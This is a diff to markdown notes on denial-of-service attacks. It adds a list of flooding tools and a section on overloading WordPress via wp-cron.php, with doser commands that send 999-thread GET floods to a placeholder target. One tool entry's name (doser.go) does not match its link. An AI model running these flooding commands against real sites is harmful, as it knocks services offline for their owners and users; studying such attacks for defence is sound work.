@@ -79,7 +79,7 @@ But however the ip address don’t exist it keeps waiting, thus it queues up and
 Now, the victim’s machine takes twice the bandwidth of the attacker – once for receiving the packets and once for sending replies. So, if the attacker already has a much higher bandwidth than the victim, the victim’s machine will get flooded with network traffic. The victim’s machine will consume large number of CPU cycles and notice significant slowdown. This attack is called Ping of Flood.
 
 
-### DDoS Tools
+### DOS/DDoS Tools
 - LOIC - Open source network stress tool for Windows.
 - JS LOIC - JavaScript in-browser version of LOIC.
 - SlowLoris - DoS tool that uses low bandwidth on the attacking side.
@@ -87,7 +87,25 @@ Now, the victim’s machine takes twice the bandwidth of the attacker – once f
 - T50 - Faster network stress tool.
 - UFONet - Abuses OSI layer 7 HTTP to create/manage 'zombies' and to conduct different attacks using; GET/POST, multithreading, proxies, origin spoofing methods, cache evasion techniques, etc.
 - Memcrashed - DDoS attack tool for sending forged UDP packets to vulnerable Memcached servers obtained using Shodan API.
-- [doser.py](https://github.com/Quitten/doser.py): DoS tool for HTTP requests
+- [doser.go](https://github.com/Quitten/doser.py): DoS tool for HTTP requests
+
+### wp-cron.php DoS attack (Wordpress)
+By default, the “wp-cron.php” file is called on every page load like anytime a client requests any Wordpress page which on high-traffic sites can cause (DoS) problems 
+
+This file usually exists under the root of wordpress site: /wp-cron.php 
+<img width="875" alt="Untitled" src="https://github.com/NayanDZ/Dos/assets/65315090/67076a7d-4c57-4acf-b9a8-7f77ad93ebe8">
+
+```
+$ python doser.py -t 999 -g 'https://target.site.com'
+
+Go Language Command (Rewrite to Golang)
+1. Compile it
+> go build doser.go
+2. Use it (For example: 999 threads sends GET requests
+./doser -t 999 -g 'https://target.site.com'
+```
+<img width="746" alt="11111" src="https://github.com/NayanDZ/Dos/assets/65315090/e73893cf-0b8a-4841-a342-025dc902af62">
+
 
 ### Usefull Refrence Link
 
